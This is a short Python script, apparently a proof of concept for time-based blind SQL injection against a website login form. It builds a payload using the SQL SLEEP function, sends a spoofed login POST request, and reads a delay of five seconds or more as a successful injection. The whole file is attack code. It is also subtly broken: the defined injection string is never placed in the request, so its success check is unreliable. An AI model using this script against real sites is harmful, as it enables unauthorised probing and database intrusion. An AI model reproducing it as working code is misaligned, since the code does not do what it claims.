import requests
import time

# Define the target URL
url = "https://www.test-site.com/login"

# Define the injection query
injection = "' OR SLEEP(5) --"

# Define the cookie value (if needed)
cookie_value = "example_cookie_value"

# Define the HTTP headers
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Cookie": "example_cookie=" + cookie_value
}

# Define the payload dictionary
payload = {
    "username": "fnln@domain.com",
# "a" can be replaced with desired injection
    "password": "password" + "a",
    "submit": "Login"
}

# Send the HTTP POST request
start_time = time.time()
response = requests.post(url, data=payload, headers=headers)
end_time = time.time()

# Determine the response time
response_time = end_time - start_time

# Check if the injection was successful
if response_time >= 5:
    print("Injection successful!")
else:
    print("Injection unsuccessful.")
